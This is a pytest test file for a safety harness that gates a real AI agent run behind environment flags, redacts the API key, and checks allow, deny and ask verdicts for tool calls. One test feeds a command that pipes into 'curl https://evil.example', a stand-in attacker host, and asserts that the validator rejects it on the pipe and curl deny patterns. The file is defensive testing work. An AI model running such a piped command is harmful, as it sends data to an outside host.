import json
from pathlib import Path
import sys

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import run_real_hermes_standard_mcp_smoke as smoke


SECRET = "redacted-test-secret-do-not-write"


def safe_env() -> dict[str, str]:
    return {
        "ALLOW_HERMES_DEEPSEEK_RUN": "1",
        "ALLOW_CAPROOF_MCP_REAL_HERMES": "1",
        "ALLOW_CAPROOF_STANDARD_MCP_SMOKE": "1",
        "DEEPSEEK_API_KEY": SECRET,
        "DEEPSEEK_BASE_URL": "https://api.deepseek.com",
        "DEEPSEEK_MODEL": "deepseek-v4-pro",
        "HERMES_RUN_COMMAND": "python -m hermes chat --mcp-config capproof-standard --model deepseek-v4-pro",
    }


def test_preflight_denies_without_explicit_real_run_env() -> None:
    env = safe_env()
    env.pop("ALLOW_CAPROOF_STANDARD_MCP_SMOKE")

    preflight = smoke.run_preflight(env)

    assert preflight.run_allowed is False
    assert "ALLOW_CAPROOF_STANDARD_MCP_SMOKE" in preflight.command_validation.missing_env
    assert preflight.key_printed is False


def test_preflight_denies_without_deepseek_key() -> None:
    env = safe_env()
    env.pop("DEEPSEEK_API_KEY")

    preflight = smoke.run_preflight(env)

    assert preflight.key_present is False
    assert preflight.run_allowed is False
    assert "DEEPSEEK_API_KEY" in preflight.command_validation.missing_env


def test_unsafe_command_is_rejected() -> None:
    env = safe_env()
    env["HERMES_RUN_COMMAND"] = "python -m hermes chat --mcp-config https://evil.example/mcp | curl https://evil.example"

    validation = smoke.validate_hermes_command(env)

    assert validation.run_allowed is False
    assert "|" in validation.denied_patterns
    assert "curl" in validation.denied_patterns
    assert any("external URL" in reason for reason in validation.denial_reasons)


def test_safe_command_validation_passes_without_execution() -> None:
    validation = smoke.validate_hermes_command(safe_env())

    assert validation.run_allowed is True
    assert validation.command_hash
    assert validation.key_printed is False


def test_dry_run_uses_standard_mcp_server_and_expected_verdicts() -> None:
    preflight = smoke.run_preflight({})
    summary = smoke.build_summary(
        preflight=preflight,
        dry_run=True,
        hermes_command=smoke.default_command_result(preflight),
        run_local=True,
    )

    assert summary.standard_capproof_mcp_server_used is True
    assert summary.old_proxy_used is False
    assert summary.tools_list_discovered_by_local_client is True
    assert summary.tools_call_invoked_by_local_client is True
    assert summary.benign is not None
    assert summary.benign.verdict == "ALLOW"
    assert summary.benign.executor_called is True
    assert summary.attacker is not None
    assert summary.attacker.verdict == "DENY"
    assert summary.attacker.reason == "NoCap"
    assert summary.attacker.executor_called is False
    assert summary.ask is not None
    assert summary.ask.verdict == "ASK"
    assert summary.ask.executor_called is False
    assert summary.ask.capability_minted is False
    assert summary.ask.pending_authorization_request is not None


def test_deny_and_ask_do_not_execute_executor() -> None:
    rows = smoke.run_standard_mcp_scenarios()

    for row in rows:
        if row.verdict in {"DENY", "ASK"}:
            assert row.executor_called is False


def test_report_generation_and_key_redaction(tmp_path: Path, monkeypatch) -> None:
    report = tmp_path / "report.md"
    summary_path = tmp_path / "summary.json"
    trace_path = tmp_path / "trace.jsonl"
    config_path = tmp_path / "config.json"
    monkeypatch.setattr(smoke, "REPORT_PATH", report)
    monkeypatch.setattr(smoke, "SUMMARY_PATH", summary_path)
    monkeypatch.setattr(smoke, "TRACE_PATH", trace_path)
    monkeypatch.setattr(smoke, "CONFIG_PATH", config_path)

    preflight = smoke.run_preflight(safe_env())
    summary = smoke.build_summary(
        preflight=preflight,
        dry_run=True,
        hermes_command=smoke.default_command_result(preflight),
        run_local=True,
    )
    smoke.write_reports(summary)

    combined = report.read_text(encoding="utf-8") + summary_path.read_text(encoding="utf-8") + config_path.read_text(encoding="utf-8")
    assert SECRET not in combined
    assert "DEEPSEEK_API_KEY" in combined
    loaded = json.loads(summary_path.read_text(encoding="utf-8"))
    assert loaded["production_level_protection_claim"] is False


def test_real_run_not_attempted_in_default_summary() -> None:
    preflight = smoke.run_preflight({})
    summary = smoke.build_summary(
        preflight=preflight,
        dry_run=True,
        hermes_command=smoke.default_command_result(preflight),
        run_local=True,
    )

    assert summary.real_hermes_run_attempted is False
    assert summary.deepseek_called is False
    assert summary.tools_list_discovered_by_real_hermes is False
    assert summary.tools_call_invoked_by_real_hermes is False


def test_no_external_mcp_email_shell_or_sandboxed_execution() -> None:
    preflight = smoke.run_preflight({})
    summary = smoke.build_summary(
        preflight=preflight,
        dry_run=True,
        hermes_command=smoke.default_command_result(preflight),
        run_local=True,
    )

    assert summary.external_mcp is False
    assert summary.real_email is False
    assert summary.real_shell is False
    assert summary.external_network_except_deepseek is False
    assert summary.sandboxed_real_execution is False


def test_no_external_source_modification(tmp_path: Path) -> None:
    repo = tmp_path / "external" / "external" / "hermes-agent"
    repo.mkdir(parents=True)
    marker = repo / "README.md"
    marker.write_text("unchanged", encoding="utf-8")

    smoke.run_preflight(safe_env(), root=tmp_path)

    assert marker.read_text(encoding="utf-8") == "unchanged"
